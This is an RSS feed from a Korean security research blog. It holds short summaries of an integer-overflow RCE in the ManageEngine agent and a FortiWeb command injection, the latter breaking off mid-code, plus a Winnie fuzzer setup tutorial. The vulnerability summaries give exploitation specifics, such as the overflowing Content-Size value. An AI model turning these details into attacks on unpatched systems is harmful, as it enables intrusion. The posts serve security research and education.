<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Mon, 23 Aug 2021 07:34:10 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[하루한줄] CVE-2021–20082: Integer Overflow to RCE — ManageEngine Asset Explorer Agent</title>
      <link>https://hackyboiz.github.io/2021/08/23/fabu1ous/2021-08-23/</link>
      <guid>https://hackyboiz.github.io/2021/08/23/fabu1ous/2021-08-23/</guid>
      <pubDate>Mon, 23 Aug 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/integer-overflow-to-r</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/tenable-techblog/integer-overflow-to-rce-manageengine-asset-explorer-agent-cve-2021-20082-7e54cb2caad5">Integer Overflow to RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>ManageEngine Asset Explorer Agent</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>ManageEngine Windows agent&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC19;&#xC740; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xC788;&#xB2E4;&#xBA74; IP spoofing&#xACFC; integer overflow&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>ManageEngine Windows agent&#xB294; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xBA70; ManageEngine server&#xB85C;&#xBD80;&#xD130; &#xC624;&#xB294; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xCEE4;&#xBA58;&#xB4DC;&#xB97C; listen &#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; agent&#xB294; &#xC801;&#xC808;&#xD55C; &#xC778;&#xC99D; &#xC808;&#xCC28;&#xAC00; &#xC5C6;&#xC774; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xCEE4;&#xBA58;&#xB4DC;&#xC758; &#xBC1C;&#xC2E0;&#xC9C0; IP&#xAC00; MangeEngine server&#xC778;&#xC9C0;&#xB9CC; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; network&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xB204;&#xAD6C;&#xB098; TLS handshake&#xB97C; &#xD1B5;&#xD574; &#xCEE4;&#xBA58;&#xB4DC;&#xB97C; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xACE0;, IP spoofing&#xC744; &#xD1B5;&#xD574; &#xCEE4;&#xBA58;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>ManageEngine Windows agent&#xB294;  ManageEngine server&#xB85C;&#xBD80;&#xD130; POST request&#xB97C; &#xBC1B;&#xC544; <code>HttpQueryInfoW</code> API&#xB97C; &#xC0AC;&#xC6A9;&#xD574; http handling&#xC744; &#xD569;&#xB2C8;&#xB2E4;. <code>Content-Size</code> &#xD544;&#xB4DC; &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD574; POST request&#xC758; data&#xB4E4;&#xC744; &#xC800;&#xC7A5;&#xD560; &#xBA54;&#xBAA8;&#xB9AC; &#xACF5;&#xAC04;&#xC744; heap&#xC5D0; &#xD560;&#xB2F9;&#xD558;&#xB294;&#xB370;, &#xD560;&#xB2F9;&#xB420; &#xD06C;&#xAE30;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>(<code>Content-Size</code> + 1) * 4 + 2</li></ul><p>ManageEngine Windows agent&#xB294; 32-bite agent&#xC774;&#xBBC0;&#xB85C; <code>Content-Size</code> &#xD544;&#xB4DC; &#xAC12;&#xC774; UNIT32_MAX/4&#xB77C;&#xBA74; &#xC704; &#xACC4;&#xC0B0;&#xC758; &#xACB0;&#xACFC;&#xB294; integer overflow&#xB85C; &#xC778;&#xD574; 2&#xAC00; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; Heap over flow&#xB85C; &#xC5F0;&#xC7A5;&#xC2DC;&#xCF1C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  </p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/spoofing/">spoofing</category>
      
      <category domain="https://hackyboiz.github.io/tags/post/">post</category>
      
      <category domain="https://hackyboiz.github.io/tags/integer-overflow/">integer overflow</category>
      
      
      <comments>https://hackyboiz.github.io/2021/08/23/fabu1ous/2021-08-23/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Harness 짜기 싫어 쓰는 Winnie 연구글 Part2</title>
      <link>https://hackyboiz.github.io/2021/08/22/fabu1ous/winnie-2/</link>
      <guid>https://hackyboiz.github.io/2021/08/22/fabu1ous/winnie-2/</guid>
      <pubDate>Sun, 22 Aug 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&quot;&gt;&lt;a href=&quot;#&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&quot;&gt;&lt;/a&gt;&amp;#xBA38;&amp;#xB9B</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="&#xBA38;&#xB9BF;&#xB9D0;"><a href="#&#xBA38;&#xB9BF;&#xB9D0;" class="headerlink" title="&#xBA38;&#xB9BF;&#xB9D0;"></a>&#xBA38;&#xB9BF;&#xB9D0;</h1><p><img src="/2021/08/22/fabu1ous/winnie-2/1.png" alt></p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. Fabu1ous &#xC785;&#xB2C8;&#xB2E4;. &#xC800;&#xBC88;&#xC5D4; Winnie&#xC5D0; &#xB300;&#xD574; &#xC124;&#xBA85;&#xC744; &#xD588;&#xC73C;&#xB2C8; &#xC774;&#xBC88;&#xC5D4; &#xC2E4;&#xC81C;&#xB85C; &#xC0AC;&#xC6A9;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;. WinAFL&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; &#xD37C;&#xC800;&#xB85C; code coverage&#xB97C; &#xB298;&#xB9AC;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD558;&#xB358; &#xAE30;&#xC874; &#xBC29;&#xC2DD;&#xC778; Intel PT&#xB098; DynamoRIO &#xB300;&#xC2E0; basic-block breakpoint&#xC640; fork&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; WinAFL&#xACFC; &#xC0AC;&#xC6A9;&#xBC95;&#xC774; &#xD06C;&#xAC8C; &#xB2E4;&#xB974;&#xC9C4; &#xC54A;&#xC9C0;&#xB9CC; &#xC0AC;&#xC804; &#xC791;&#xC5C5;&#xC774; &#xC870;&#xAE08; &#xB2E4;&#xB985;&#xB2C8;&#xB2E4;. &#xC624;&#xB298;&#xC740; Winnie&#xB97C; &#xC4F0;&#xAE30; &#xC704;&#xD574; &#xD574;&#xC57C; &#xD558;&#xB294; &#xC0AC;&#xC804;&#xC791;&#xC5C5;&#xB4E4;&#xC744; &#xC54C;&#xC544;&#xBCF4;&#xACE0; Winnie&#xB97C; &#xC2E4;&#xD589;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><h1 id="Winnie"><a href="#Winnie" class="headerlink" title="Winnie"></a>Winnie</h1><p><a href="https://github.com/sslab-gatech/winnie">sslab-gatech/winnie</a></p><p>&#xC6B0;&#xC120; Winnie &#xACF5;&#xC2DD; github&#xC5D0; &#xAC00;&#xC154;&#xC11C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD569;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/08/22/fabu1ous/winnie-2/2.png" alt></p><h1 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h1><p>forklib&#xB294; unix &#xACC4;&#xC5F4; OS&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; fork()&#xB97C; windows&#xC5D0; &#xD3EC;&#xD305;&#xD55C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB85C;</p><p>csrss.dll&#xACFC; ntdll.dll&#xC744; &#xB9AC;&#xBC84;&#xC2F1; &#xD574; &#xC5BB;&#xC740; offset&#xB4E4;&#xC774; &#xD558;&#xB4DC; &#xCF54;&#xB529;&#xB418;&#xC5B4;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xB9DE;&#xAC8C; &#xCEF4;&#xD30C;&#xC77C;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xD544;&#xC694;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xB4E4;&#xC744; &#xC54C;&#xC544;&#xC11C; &#xD30C;&#xC2F1; &#xD574;&#xC624;&#xB294; python &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xAC19;&#xC774; &#xC81C;&#xACF5;&#xD558;&#xACE0; &#xC788;&#xC5B4;&#xC11C; &#xC800;&#xD76C;&#xB294; &#xC2E4;&#xD589;&#xB9CC; &#xD574;&#xC8FC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/22/fabu1ous/winnie-2/3.png" alt></p><p><code>gen_csrss_offsets.py</code> &#xC774;&#xB188;&#xB9CC; &#xC2E4;&#xD589;&#xC2DC;&#xCF1C;&#xC8FC;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. python 3&#xB294; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xACE0; &#xD558;&#xB2C8; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; python 2&#xB97C; &#xC124;&#xCE58;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC800;&#xC758; &#xACBD;&#xC6B0; python2.7.13&#xC744; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/22/fabu1ous/winnie-2/4.png" alt></p><p>&#xC8FC;&#xC758;&#xD558;&#xC2E4; &#xC810;&#xC740; python2-x64&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC154;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. 32-bit&#xC6A9; pyhton &#xB610;&#xD55C; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>python2&#xB97C; &#xC124;&#xCE58;&#xD558;&#xC168;&#xB2E4;&#xBA74; &#xC544;&#xB798; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xCC28;&#xB798;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xD574;&#xC8FC;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">python -m pip install --upgrade pippython -m pip install construct pefilepython ./gen_csrss_offsets.py</code></pre><p><img src="/2021/08/22/fabu1ous/winnie-2/5.png" alt></p><p><code>csrss_offset.h</code>&#xB97C; &#xC0DD;&#xC131;&#xD588;&#xB2E4;&#xB294; &#xBB38;&#xAD6C;&#xB97C; &#xD655;&#xC778;&#xD558;&#xC168;&#xB2E4;&#xBA74; &#xC131;&#xACF5;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/22/fabu1ous/winnie-2/6.png" alt></p><p>&#xC0DD;&#xC131;&#xB41C; <code>csrss_offsets.h</code> &#xD574;&#xB354; &#xD30C;&#xC77C;&#xC5D0;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xB9DE;&#xB294; offset&#xB4E4;&#xC774; &#xB2F4;&#xACA8;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/22/fabu1ous/winnie-2/7.png" alt></p><p>&#xC790;, &#xC774;&#xC81C; &#xC2E4;&#xC81C;&#xB85C; &#xBE4C;&#xB4DC;&#xB97C; &#xD560; &#xCC28;&#xB840;&#xC785;&#xB2C8;&#xB2E4;. FullSpeed.sln &#xC194;&#xB8E8;&#xC158;&#xC744; VisualStudio2017 &#xD639;&#xC740; VisualStudio2019&#xC73C;&#xB85C; &#xC5F4;&#xC5B4; Realease x64 configuration&#xC73C;&#xB85C; &#xBE4C;&#xB4DC;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC800;&#xB294; VisualStudio2019&#xB97C; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/22/fabu1ous/winnie-2/8.png" alt></p><p>&#xBE4C;&#xB4DC;&#xB97C; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xB9C8;&#xCE58;&#xC168;&#xB2E4;&#xBA74; winnie-master&#xD3F4;&#xB354; &#xB0B4;&#xBD80;&#xC5D0; x64&#xB77C;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xD3F4;&#xB354;&#xAC00; &#xC0DD;&#xC131;&#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD558;&#xC2E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Ready-to-Fuzz"><a href="#Ready-to-Fuzz" class="headerlink" title="Ready to Fuzz"></a>Ready to Fuzz</h1><p><img src="/2021/08/22/fabu1ous/winnie-2/9.png" alt></p><p>Winnie&#xC758; &#xAE43;&#xD5D9;&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD558;&#xB294; Toy example&#xC744; &#xD1B5;&#xD574; winnie&#xC758; &#xC0AC;&#xC6A9;&#xBC95;&#xC744; &#xC54C;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;. &#xC6B0;&#xC120; <code>winnie-master/samples/toy_example</code> &#xACBD;&#xB85C;&#xB85C; &#xC774;&#xB3D9;&#xD574; <code>toy_example.sln</code> &#xC194;&#xB8E8;&#xC158;&#xC744; &#xBE4C;&#xB4DC;&#xD574;&#xC90D;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/08/22/fabu1ous/winnie-2/10.png" alt></p><p>Release x64&#xB85C; &#xBE4C;&#xB4DC;&#xB97C; &#xB9C8;&#xCE58;&#xC168;&#xB2E4;&#xBA74; Toy example &#xD3F4;&#xB354;&#xC5D0; x64&#xB77C;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xD3F4;&#xB354;&#xAC00; &#xC0DD;&#xC131;&#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD558;&#xC2E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; &#xC800;&#xD76C;&#xAC00; &#xC0AC;&#xC6A9;&#xD560; 3&#xAC00;&#xC9C0; &#xD30C;&#xC77C;&#xC744; &#xBCF5;&#xC0AC;&#xD574; afl-fuzz.exe&#xC640; &#xAC19;&#xC740; &#xD3F4;&#xB354;&#xB85C; &#xC62E;&#xAE30;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC608;&#xC2DC; input &#xD30C;&#xC77C; &#xB610;&#xD55C; &#xC81C;&#xACF5;&#xD574; &#xC8FC;&#xB2C8; &#xC774;&#xAC83;&#xB3C4; &#xBCF5;&#xC0AC;&#xD574;&#xC90D;&#xC2DC;&#xB2E4;.</p><ul><li>example_library.dll : target module&#xC774; &#xB420; dll&#xC785;&#xB2C8;&#xB2E4;.</li><li>harness.dll : winnie&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; harness&#xC758; &#xAC00;&#xC7A5; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xC608;&#xC2DC;&#xC785;&#xB2C8;&#xB2E4;.</li><li>toy_example.exe : target program&#xC774; &#xB420; &#xBA54;&#xC778; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC785;&#xB2C8;&#xB2E4;.</li></ul><p><img src="/2021/08/22/fabu1ous/winnie-2/11.png" alt></p><p><code>winnie-master/x64/Release</code> &#xACBD;&#xB85C;(&#xC774;&#xD558; working directory)&#xB85C; &#xC774;&#xB3D9;&#xD574; &#xC704;&#xC5D0;&#xC11C; &#xC5B8;&#xAE09;&#xD55C; &#xC138; &#xAC1C;&#xC758; &#xD30C;&#xC77C;&#xACFC; &#xC608;&#xC81C; input&#xC758; &#xBCF5;&#xC0AC;&#xBCF8;&#xC744; &#xC0DD;&#xC131;&#xD574;&#xC8FC;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/22/fabu1ous/winnie-2/12.png" alt></p><p>&#xC800;&#xBC88; Part&#xC5D0;&#xC11C; &#xAC04;&#xB7B5;&#xD558;&#xAC8C; &#xC124;&#xBA85;&#xD588;&#xB4EF;&#xC774; winnie&#xC758; full-speed instrumentation&#xC740; basic block&#xB2E8;&#xC704;&#xB85C; break point&#xB97C; &#xAC78;&#xC5B4; coverage&#xB97C; &#xAE30;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; target module&#xC758; basic block&#xC5D0; &#xB300;&#xD55C; &#xC8FC;&#xC18C;&#xB4E4;&#xC744; &#xC694;&#xAD6C;&#xD558;&#xB294;&#xB370; &#xC774;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xC744; basic-block-file(bb-file)&#xC774;&#xB77C; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;. winnie&#xC5D0; &#xD3EC;&#xD568;&#xB41C; bb.py&#xB77C;&#xB294; IDA&#xC6A9; python script&#xB97C; &#xC0AC;&#xC6A9;&#xD574; bb-file&#xC744; &#xC0DD;&#xC131;&#xD574; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/08/22/fabu1ous/winnie-2/13.png" alt></p><p>&#xAC01; &#xBAA8;&#xB4C8;&#xC744; IDA Pro&#xB85C; &#xC5F4;&#xACE0; [&#xC0C1;&#xB2E8;&#xBA54;&#xB274; &gt; File &gt; Script file&#x2026;]&#xC744; &#xD1B5;&#xD574; bb.py&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xCF1C; working directory&#xC5D0; basicblocks.bb&#xB77C;&#xB294; &#xD30C;&#xC77C;&#xC774; &#xC0DD;&#xC131;&#xD574;&#xC8FC;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC800;&#xD76C;&#xC758; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; toy_example.exe&#xC640; example_library.dll, &#xCD1D; 2&#xAC1C;&#xC758; &#xBAA8;&#xB4C8;&#xC5D0; &#xB300;&#xD55C; bb &#xC815;&#xBCF4;&#xB97C; &#xD68D;&#xB4DD;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; basicblocks.bb&#xB77C;&#xB294; &#xD30C;&#xC77C;&#xC774; &#xC774;&#xBBF8; &#xC0DD;&#xC131; &#xACBD;&#xB85C;&#xC5D0; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xBA74; &#xB36E;&#xC5B4;&#xC4F0;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2C8;&#xB77C; &#xAE30;&#xC874; &#xB0B4;&#xC6A9;&#xC5D0; &#xC0C8;&#xB85C;&#xC6B4; bb &#xC815;&#xBCF4;&#xAC00; &#xCD94;&#xAC00;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/22/fabu1ous/winnie-2/14.png" alt></p><p>&#xC704; &#xC0AC;&#xC9C4;&#xC740; &#xC0DD;&#xC131;&#xB41C; bb-file&#xC758; &#xC77C;&#xBD80; &#xBAA8;&#xC2B5;&#xC785;&#xB2C8;&#xB2E4;. &#xC0DD;&#xC131;&#xB41C; bb-file&#xC5D0; toy_example.exe&#xC640; example_library.dll&#xC758; bb &#xC815;&#xBCF4;&#xAC00; &#xBAA8;&#xB450; &#xB4E4;&#xC5B4;&#xC788;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD558;&#xC168;&#xB2E4;&#xBA74; &#xD37C;&#xC9D5; &#xD560; &#xC900;&#xBE44;&#xB294; &#xB05D;&#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h1><pre><code class="hljs bash">afl-fuzz [AFL &#xC635;&#xC158;] -- [fullspeed &#xC635;&#xC158;] -- [fork server &#xC635;&#xC158;] -- [target argv]</code></pre><p>Winnie&#xB85C; &#xD37C;&#xC9D5;&#xC744; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xBA85;&#xB839;&#xC5B4;&#xB294; &#xC704;&#xACFC; &#xAC19;&#xC740; &#xD615;&#xD0DC;&#xC785;&#xB2C8;&#xB2E4;. &#xAC01;&#xAC01; &#xC635;&#xC158;&#xB4E4;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>AFL &#xC635;&#xC158; : input &#xBC0F; output &#xD30C;&#xC77C; &#xACBD;&#xB85C;, &#xD0C0;&#xC784; &#xC544;&#xC6C3; &#xC124;&#xC815;</li><li>fullspeed &#xC635;&#xC158; : fullspeed intrumentation&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB4E4;(&#xC608;&#xB97C; &#xB4E4;&#xBA74; bb-file)</li><li>fork server &#xC635;&#xC158; : harness&#xC758; &#xACBD;&#xB85C; &#xC9C0;&#xC815;, fork server&#xC758; &#xB3D9;&#xC791; &#xC124;&#xC815;</li><li>target argv : target program &#xACBD;&#xB85C; &#xBC0F; &#xC544;&#xADDC;&#xBA3C;&#xD2B8; &#xC124;&#xC815;</li></ul><pre><code class="hljs bash">afl-fuzz -i <span class="hljs-keyword">in</span> -o out -t 1000 -I 1000 -- -bbfile basicblocks.bb -- -harness harness.dll -no_minidumps -- toy_example @@</code></pre><h1 id="&#xB2E4;&#xC74C;-&#xD30C;&#xD2B8;-&#xC608;&#xACE0;"><a href="#&#xB2E4;&#xC74C;-&#xD30C;&#xD2B8;-&#xC608;&#xACE0;" class="headerlink" title="&#xB2E4;&#xC74C; &#xD30C;&#xD2B8; &#xC608;&#xACE0;"></a>&#xB2E4;&#xC74C; &#xD30C;&#xD2B8; &#xC608;&#xACE0;</h1><p>&#xC800;&#xBC88; Winnie Part 1&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xB300;&#xB85C; Winnie&#xB294; 2&#xAC1C;&#xC758; &#xB2E8;&#xACC4;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAE30;&#xC874; &#xD37C;&#xC800;&#xB4E4;&#xACFC; &#xB2E4;&#xB978; &#xCC28;&#xBCC4;&#xC810;&#xC774;&#xC790; Winnie&#xC5D0;&#xC11C; &#xC8FC;&#xBAA9;&#xD574;&#xC57C; &#xD560; &#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><ol><li><p>Semi-automated Harness Generater</p><p>Winnie &#xB610;&#xD55C; WinAFL&#xC5D0;&#xC11C; &#xD30C;&#xC0DD;&#xB41C; fuzzer&#xC774;&#xBBC0;&#xB85C; Harness &#xC791;&#xC131;&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. Winnie&#xB97C; &#xC8FC;&#xC81C;&#xB85C; &#xAE00;&#xC744; &#xC4F0;&#xAE30; &#xC2DC;&#xC791;&#xD55C; &#xC774;&#xC720;&#xC778; &#xC790;&#xB3D9; Harness &#xC0DD;&#xC131;&#xAE30;&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xBCF4;&#xACE0; &#xADF8; &#xB3D9;&#xC791;&#xC744; &#xBD84;&#xC11D;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p></li><li><p>Full Speed instrumentation Fuzzing</p><p>Winnie&#xB294; fork&#xC640; basic-block &#xB2E8;&#xC704; breakpoint&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; full speed instrumentation fuzzing&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xBA74; fork&#xC758; windows &#xD3EC;&#xD305;&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xAD6C;&#xC131;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p></li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/fuzzing/">fuzzing</category>
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/harness/">harness</category>
      
      <category domain="https://hackyboiz.github.io/tags/bug-bounty/">bug bounty</category>
      
      <category domain="https://hackyboiz.github.io/tags/winnie/">winnie</category>
      
      
      <comments>https://hackyboiz.github.io/2021/08/22/fabu1ous/winnie-2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄]  CVE-2021-22123 : Fortinet FortiWeb OS Command Injection</title>
      <link>https://hackyboiz.github.io/2021/08/20/j0ker/2021-08-20/</link>
      <guid>https://hackyboiz.github.io/2021/08/20/j0ker/2021-08-20/</guid>
      <pubDate>Fri, 20 Aug 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt; &lt;a href=&quot;https://www.rapid7.com/blog/post/2021/08/17/fortinet-for</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p> <a href="https://www.rapid7.com/blog/post/2021/08/17/fortinet-fortiweb-os-command-injection/">Fortinet FortiWeb OS Command Injection</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>FortiWeb OS</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Fortinet&#xC758; FortiWeb&#xC740; &#xC6F9; &#xBC29;&#xD654;&#xBCBD;(Web Application Firewall, WAF) &#xC81C;&#xD488;&#xC774;&#xBA70; &#xC548;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; FortiWeb OS&#xC5D0;&#xC11C; &#xC778;&#xC99D; &#xC5C6;&#xC774; &#xC6D0;&#xACA9;&#xC5D0;&#xC11C; Command Injection&#xC744; &#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">move_metafile</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *path,<span class="hljs-keyword">char</span> *name)</span></span><span class="hljs-function"></span>{<span class="hljs-keyword">int</span> iVar1;<span class="hljs-keyword">char</span> buf [<span class="hljs-number">512</span>];<span class="hljs-keyword">int</span> nret;<span class="hljs-built_in">snprintf</span>(buf,<span class="hljs-number">0x200</span>,<span class="hljs-string">&quot;%s/%s&quot;</span>,<span class="hljs-string">&quot;/data/etc/saml/shibboleth/service_providers&quot;</span>,name);iVar1 